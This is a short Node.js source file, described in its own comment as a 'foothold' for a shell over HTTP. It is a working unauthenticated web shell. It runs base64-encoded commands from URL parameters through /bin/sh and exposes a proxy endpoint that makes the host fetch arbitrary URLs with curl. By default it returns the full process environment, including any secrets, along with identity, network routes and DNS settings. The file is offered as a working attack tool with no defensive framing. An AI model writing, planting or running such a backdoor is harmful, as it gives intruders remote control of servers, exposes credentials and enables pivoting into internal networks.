// A59 foothold: shell over HTTP. GET /?c=<b64cmd>  GET /raw?c=<b64cmd>  GET /proxy?u=<url>
const http = require('http');
const { execSync } = require('child_process');
function sh(c) {
  try { return execSync(c, { encoding: 'utf8', timeout: 25000, shell: '/bin/sh', maxBuffer: 16 * 1024 * 1024 }); }
  catch (e) { return 'ERR ' + e.message + '\n' + (e.stdout || '') + (e.stderr || ''); }
}
const srv = http.createServer((req, res) => {
  const u = new URL(req.url, 'http://x');
  const b = u.searchParams.get('c');
  if (u.pathname === '/proxy') {
    const t = u.searchParams.get('u');
    const out = sh(`curl -s -m 12 -w '\\nHTTP:%{http_code}' '${t.replace(/'/g, "%27")}'`);
    res.writeHead(200, { 'content-type': 'text/plain' });
    return res.end(out);
  }
  if (u.pathname === '/raw' && b) {
    res.writeHead(200, { 'content-type': 'text/plain' });
    return res.end(sh(Buffer.from(b, 'base64').toString('utf8')));
  }
  let out;
  if (b) out = { cmd: Buffer.from(b, 'base64').toString('utf8'), out: sh(Buffer.from(b, 'base64').toString('utf8')) };
  else out = { whoami: sh('id'), host: sh('hostname'), route: sh('ip route 2>&1; ip -4 a 2>&1'), env: process.env, res: sh('cat /etc/resolv.conf 2>&1') };
  res.writeHead(200, { 'content-type': 'application/json' });
  res.end(JSON.stringify(out, null, 1));
});
srv.listen(process.env.PORT || 8080, () => console.log('up on ' + (process.env.PORT || 8080)));
